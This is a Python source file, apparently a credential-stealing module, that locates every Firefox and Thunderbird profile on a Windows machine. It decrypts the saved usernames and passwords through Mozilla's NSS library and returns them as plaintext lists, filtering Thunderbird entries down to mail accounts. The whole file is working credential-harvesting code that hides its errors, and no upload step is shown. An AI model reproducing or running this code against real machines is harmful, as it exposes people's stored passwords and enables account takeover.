import ctypes as ct
import json
import os
import sqlite3
import sys
from base64 import b64decode
from configparser import ConfigParser

DEFAULT_ENCODING = "utf-8"

class c_char_p_fromstr(ct.c_char_p):
    """ctypes char_p override that handles encoding str to bytes"""
    def from_param(self):
        return self.encode(DEFAULT_ENCODING)

def find_nss_windows():
    """Locate NSS library on Windows for Mozilla apps"""
    nssname = "nss3.dll"
    locations = [
        "",  # Current directory
        os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
        os.path.expanduser("~\\AppData\\Local\\Thunderbird"),
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files\\Mozilla Thunderbird",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Thunderbird",
    ]

    for loc in locations:
        nsslib = os.path.join(loc, nssname) if loc else nssname
        
        if loc and os.path.isdir(loc):
            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
            workdir = os.getcwd()
            os.chdir(loc)

        try:
            nss = ct.CDLL(nsslib)
            return nss
        except OSError:
            pass
        finally:
            if loc and os.path.isdir(loc):
                os.chdir(workdir)

    raise Exception("NSS library not found")

class NSSProxy:
    class SECItem(ct.Structure):
        _fields_ = [
            ("type", ct.c_uint),
            ("data", ct.c_char_p),
            ("len", ct.c_uint),
        ]

        def decode_data(self):
            _bytes = ct.string_at(self.data, self.len)
            return _bytes.decode(DEFAULT_ENCODING)

    class PK11SlotInfo(ct.Structure):
        pass

    def __init__(self):
        self.libnss = find_nss_windows()
        
        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
        SECItemPtr = ct.POINTER(self.SECItem)

        self.libnss.NSS_Init.argtypes = [c_char_p_fromstr]
        self.libnss.NSS_Init.restype = ct.c_int
        self.libnss.NSS_Shutdown.argtypes = []
        self.libnss.NSS_Shutdown.restype = ct.c_int
        self.libnss.PK11SDR_Decrypt.argtypes = [SECItemPtr, SECItemPtr, ct.c_void_p]
        self.libnss.PK11SDR_Decrypt.restype = ct.c_int
        self.libnss.SECITEM_ZfreeItem.argtypes = [SECItemPtr, ct.c_int]
        self.libnss.SECITEM_ZfreeItem.restype = None

    def initialize(self, profile_path):
        profile_path = "sql:" + profile_path
        err_status = self.libnss.NSS_Init(profile_path)
        if err_status:
            raise Exception("Failed to initialize NSS")

    def shutdown(self):
        try:
            self.libnss.NSS_Shutdown()
        except:
            pass

    def decrypt(self, data64):
        try:
            data = b64decode(data64)
            inp = self.SECItem(0, data, len(data))
            out = self.SECItem(0, None, 0)
            err_status = self.libnss.PK11SDR_Decrypt(inp, out, None)
            
            try:
                if err_status:
                    return None
                res = out.decode_data()
            finally:
                self.libnss.SECITEM_ZfreeItem(out, 0)
            return res
        except:
            return None

class CredentialsManager:
    def __init__(self, profile):
        self.json_db = os.path.join(profile, "logins.json")
        self.sqlite_db = os.path.join(profile, "signons.sqlite")
        self.conn = None
        self.cursor = None

    def get_credentials(self):
        # Try JSON first
        if os.path.isfile(self.json_db):
            yield from self._get_json_credentials()
        # Fallback to SQLite
        elif os.path.isfile(self.sqlite_db):
            yield from self._get_sqlite_credentials()

    def _get_json_credentials(self):
        with open(self.json_db, encoding='utf-8') as fh:
            data = json.load(fh)
            for login in data.get("logins", []):
                try:
                    yield (login["hostname"], login["encryptedUsername"], 
                           login["encryptedPassword"], login["encType"])
                except KeyError:
                    continue

    def _get_sqlite_credentials(self):
        self.conn = sqlite3.connect(self.sqlite_db)
        self.cursor = self.conn.cursor()
        self.cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
        yield from self.cursor

    def close(self):
        if self.cursor:
            self.cursor.close()
        if self.conn:
            self.conn.close()

def get_mozilla_profiles(app_name):
    """Get all Mozilla app profiles (Firefox or Thunderbird)"""
    if app_name.lower() == 'firefox':
        app_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    else:  # thunderbird
        app_path = os.path.join(os.environ["APPDATA"], "Thunderbird")
    
    profileini = os.path.join(app_path, "profiles.ini")
    profiles = []
    
    if not os.path.isfile(profileini):
        return profiles

    config = ConfigParser()
    config.read(profileini, encoding=DEFAULT_ENCODING)
    
    for section in config.sections():
        if section.startswith("Profile"):
            try:
                profile_path = config.get(section, "Path")
                is_relative = config.getboolean(section, "IsRelative", fallback=True)
                
                if is_relative:
                    full_path = os.path.join(app_path, profile_path)
                else:
                    full_path = profile_path
                
                if os.path.isdir(full_path):
                    profiles.append(full_path)
            except Exception:
                continue
    
    return profiles

def extract_from_profile(profile_path, app_name):
    """Extract passwords from a single Mozilla profile"""
    results = []
    seen_entries = set()  # To avoid duplicates
    
    try:
        nss = NSSProxy()
        nss.initialize(profile_path)
        
        credentials = CredentialsManager(profile_path)
        
        for url, enc_user, enc_pass, enctype in credentials.get_credentials():
            if enctype:
                username = nss.decrypt(enc_user)
                password = nss.decrypt(enc_pass)
            else:
                username = enc_user
                password = enc_pass
            
            if username and password:
                # Create unique identifier to avoid duplicates
                entry_id = f"{url}|{username}|{password}"
                if entry_id not in seen_entries:
                    seen_entries.add(entry_id)
                    
                    # For Thunderbird, filter email-related entries
                    if app_name.lower() == 'thunderbird':
                        if any(protocol in url.lower() for protocol in ['smtp', 'pop', 'imap', 'mail', '@']):
                            results.append({
                                'browser': 'Thunderbird',
                                'url': url,
                                'username': username,
                                'password': password
                            })
                    else:  # Firefox
                        results.append({
                            'browser': 'Firefox',
                            'url': url,
                            'username': username,
                            'password': password
                        })
        
        credentials.close()
        nss.shutdown()
        
    except Exception:
        pass
    
    return results

def fetch_firefox_passwords():
    """Extract Firefox passwords from all profiles"""
    all_results = []
    profiles = get_mozilla_profiles('firefox')
    
    for profile_path in profiles:
        results = extract_from_profile(profile_path, 'firefox')
        all_results.extend(results)
    
    return all_results

def fetch_thunderbird_passwords():
    """Extract Thunderbird passwords from all profiles"""
    all_results = []
    profiles = get_mozilla_profiles('thunderbird')
    
    for profile_path in profiles:
        results = extract_from_profile(profile_path, 'thunderbird')
        all_results.extend(results)
    
    return all_results
